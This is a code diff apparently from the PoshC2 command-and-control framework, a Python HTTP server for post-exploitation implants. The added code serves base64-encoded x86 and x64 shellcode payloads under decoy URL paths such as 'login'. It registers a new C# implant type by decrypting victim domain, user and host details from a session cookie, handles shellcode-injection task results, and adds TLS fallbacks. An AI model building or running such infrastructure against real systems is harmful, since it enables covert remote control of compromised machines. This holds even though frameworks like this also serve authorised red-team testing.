@@ -79,6 +79,26 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           s.end_headers()
           s.wfile.write(content)
 
+        elif ("%spotal" % QuickCommandURI) in s.path:
+          filename = "%sSharp-shellcode_x86.bin" % (PayloadsDirectory)
+          with open(filename, 'rb') as f:
+            content = f.read()
+          content = base64.b64encode(content)
+          s.send_response(200)
+          s.send_header("Content-type", "text/html")
+          s.end_headers()
+          s.wfile.write(content)
+
+        elif ("%slogin" % QuickCommandURI) in s.path:
+          filename = "%sSharp-shellcode_x64.bin" % (PayloadsDirectory)
+          with open(filename, 'rb') as f:
+            content = f.read()
+          content = base64.b64encode(content)
+          s.send_response(200)
+          s.send_header("Content-type", "text/html")
+          s.end_headers()
+          s.wfile.write(content)
+
         elif ("%s_cs" % QuickCommandURI) in s.path:
           filename = "%scs_sct.xml" % (PayloadsDirectory)
           with open(filename, 'rb') as f:
@@ -125,8 +145,26 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
             implant_type = "Daisy"
           if s.path == ("%s?m" % new_implant_url):
             implant_type = "OSX"
-
-          if implant_type == "OSX":
+          if s.path == ("%s?c" % new_implant_url):
+            implant_type = "C#"
+          if s.path == ("%s?p?c" % new_implant_url):
+            implant_type = "C#"
+                      
+          if implant_type == "C#":
+            cookieVal = (s.cookieHeader).replace("SessionID=","")
+            decCookie = decrypt(KEY, cookieVal)
+            IPAddress = "%s:%s" % (s.client_address[0],s.client_address[1])
+            Domain,User,Hostname,Arch,PID,Proxy = decCookie.split(";")
+            newImplant = Implant(IPAddress, implant_type, Domain.decode("utf-8"), User.decode("utf-8"), Hostname.decode("utf-8"), Arch, PID, Proxy)
+            newImplant.save()
+            newImplant.display()
+            responseVal = encrypt(KEY, newImplant.SharpCore)
+            s.send_response(200)
+            s.send_header("Content-type", "text/html")
+            s.end_headers()
+            s.wfile.write(responseVal)
+            
+          elif implant_type == "OSX":
             cookieVal = (s.cookieHeader).replace("SessionID=","")
             decCookie = decrypt(KEY, cookieVal)
             IPAddress = "%s:%s" % (s.client_address[0],s.client_address[1])
@@ -218,6 +256,9 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
               elif (decCookie.lower().startswith("$shellcode64")) or (decCookie.lower().startswith("$shellcode64")):
                 insert_completedtask(RandomURI, decCookie, "Upload shellcode complete", "")
                 print ("Upload shellcode complete")
+              elif (decCookie.lower().startswith("run-exe core.program core inject-shellcode")):
+                insert_completedtask(RandomURI, decCookie, "Upload shellcode complete", "")
+                print (outputParsed)
               elif "download-file" in decCookie.lower():
                 try:
                   rawoutput = decrypt_bytes_gzip(encKey, (post_data[1500:]))
@@ -319,9 +360,19 @@ if __name__ == '__main__':
     print (Colours.END)
 
     if (os.path.isfile("%sposh.crt" % ROOTDIR)) and (os.path.isfile("%sposh.key" % ROOTDIR)):
-      httpd.socket = ssl.wrap_socket (httpd.socket, keyfile="%sposh.key" % ROOTDIR, certfile="%sposh.crt" % ROOTDIR, server_side=True, ssl_version=ssl.PROTOCOL_TLS)
-      # add this if required - https://github.com/nettitude/PoshC2_Python/issues/13
-      # httpd.socket = ssl.wrap_socket (httpd.socket, keyfile="%sposh.key" % ROOTDIR, certfile="%sposh.crt" % ROOTDIR, server_side=True, ssl_version=ssl.PROTOCOL_TLSv1)
+      try:
+        if UseTLSv1:
+            httpd.socket = ssl.wrap_socket (httpd.socket, keyfile="%sposh.key" % ROOTDIR, certfile="%sposh.crt" % ROOTDIR, server_side=True, ssl_version=ssl.PROTOCOL_TLSv1)
+        else:
+          try:
+            httpd.socket = ssl.wrap_socket (httpd.socket, keyfile="%sposh.key" % ROOTDIR, certfile="%sposh.crt" % ROOTDIR, server_side=True, ssl_version=ssl.PROTOCOL_TLS)
+          except Exception as e:
+            httpd.socket = ssl.wrap_socket (httpd.socket, keyfile="%sposh.key" % ROOTDIR, certfile="%sposh.crt" % ROOTDIR, server_side=True, ssl_version=ssl.PROTOCOL_TLSv1)
+      except Exception as e:
+        try:
+          httpd.socket = ssl.wrap_socket (httpd.socket, keyfile="%sposh.key" % ROOTDIR, certfile="%sposh.crt" % ROOTDIR, server_side=True, ssl_version=ssl.PROTOCOL_TLS)
+        except Exception as e:
+          httpd.socket = ssl.wrap_socket (httpd.socket, keyfile="%sposh.key" % ROOTDIR, certfile="%sposh.crt" % ROOTDIR, server_side=True, ssl_version=ssl.PROTOCOL_TLSv1)
     else:
       raise ValueError("Cannot find the certificate files")
     #logging.basicConfig(level=logging.WARNING) # DEBUG,INFO,WARNING,ERROR,CRITICAL
